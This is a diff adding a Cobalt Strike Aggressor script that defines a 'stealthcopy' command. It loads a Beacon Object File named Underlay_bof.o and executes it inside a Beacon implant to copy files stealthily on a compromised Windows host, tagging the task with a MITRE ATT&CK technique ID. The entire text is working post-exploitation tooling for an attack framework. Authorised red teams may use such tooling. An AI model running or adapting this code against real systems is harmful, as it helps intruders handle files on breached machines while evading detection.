@@ -1,0 +1,30 @@
+alias stealthcopy {
+    local('$src $dst $bofdata $args');
+
+    # Check if arguments exist. 
+    if ($3 eq "") {
+        berror($1, "Usage: stealthcopy \"C:\\src\\path\" \"C:\\dst\\path\"");
+        return;
+    }
+
+    $src = $2;
+    $dst = $3;
+
+    # Read the BOF file correctly
+    $handle = openf(script_resource("Underlay_bof.o"));
+    $bofdata = readb($handle, -1);
+    closef($handle);
+
+    if (strlen($bofdata) == 0) {
+        berror($1, "Error: Underlay_bof.o is empty or missing at: " . script_resource("Underlay_bof.o"));
+        return;
+    }
+
+    $args = bof_pack($1, "zz", $src, $dst);
+
+    # Log the task to the beacon console
+    btask($1, "Tasked Beacon to stealthily copy $src to $dst", "T1544");
+    
+    # Execute: The first param MUST be the Beacon ID ($1)
+    beacon_inline_execute($1, $bofdata, "go", $args);
+}
